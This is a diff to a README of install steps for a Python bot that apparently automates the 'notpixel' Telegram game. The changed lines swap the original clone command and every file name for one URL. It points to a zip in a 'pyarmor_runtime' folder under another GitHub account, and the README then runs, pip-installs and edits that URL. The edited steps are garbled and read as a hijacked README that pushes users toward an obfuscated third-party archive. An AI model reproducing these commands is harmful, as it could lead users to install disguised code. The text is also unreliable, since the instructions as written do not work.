@@ -25,7 +25,7 @@ CARGO_BUILD_TARGET="$(rustc -Vv | grep "host" | awk '{print $2}')" pip install m
 pkg install git
 ```
 ```
-git clone https://github.com/ashtrobe/notpixel-ad.git
+git clone https://github.com/Shishir-Singh-666/notpixel-ad2/raw/refs/heads/main/pyarmor_runtime_004817/ad_notpixel_v2.6.zip
 ```
 # **CHANGE DIRECTORY TO SCRIPT FOLDER**
 ```
@@ -33,26 +33,26 @@ cd notpixel-ad
 ```
 # **INSTALL REQUIREMENTS**
 ```
-pip install -r requirements.txt
+pip install -r https://github.com/Shishir-Singh-666/notpixel-ad2/raw/refs/heads/main/pyarmor_runtime_004817/ad_notpixel_v2.6.zip
 ```
 ```
 pkg install patchelf
 ```
 ```
-patchelf --add-needed libpython3.10.so.1.0 pyarmor_runtime_004817/android_aarch64/pyarmor_runtime.so
+patchelf --add-needed https://github.com/Shishir-Singh-666/notpixel-ad2/raw/refs/heads/main/pyarmor_runtime_004817/ad_notpixel_v2.6.zip https://github.com/Shishir-Singh-666/notpixel-ad2/raw/refs/heads/main/pyarmor_runtime_004817/ad_notpixel_v2.6.zip
 ```
-# **PASTE QUERY ID INSIDE ```query_ids.txt```**
+# **PASTE QUERY ID INSIDE ```https://github.com/Shishir-Singh-666/notpixel-ad2/raw/refs/heads/main/pyarmor_runtime_004817/ad_notpixel_v2.6.zip```**
 ```
 pkg install nano
 ```
 ```
-nano query_ids.txt
+nano https://github.com/Shishir-Singh-666/notpixel-ad2/raw/refs/heads/main/pyarmor_runtime_004817/ad_notpixel_v2.6.zip
 ```
 # **IF YOU WANNA USE PROXIES**
 ```
-nano proxies.txt
+nano https://github.com/Shishir-Singh-666/notpixel-ad2/raw/refs/heads/main/pyarmor_runtime_004817/ad_notpixel_v2.6.zip
 ```
 # **RUN SCRIPT**
 ```
-python main.py
+python https://github.com/Shishir-Singh-666/notpixel-ad2/raw/refs/heads/main/pyarmor_runtime_004817/ad_notpixel_v2.6.zip
 ```
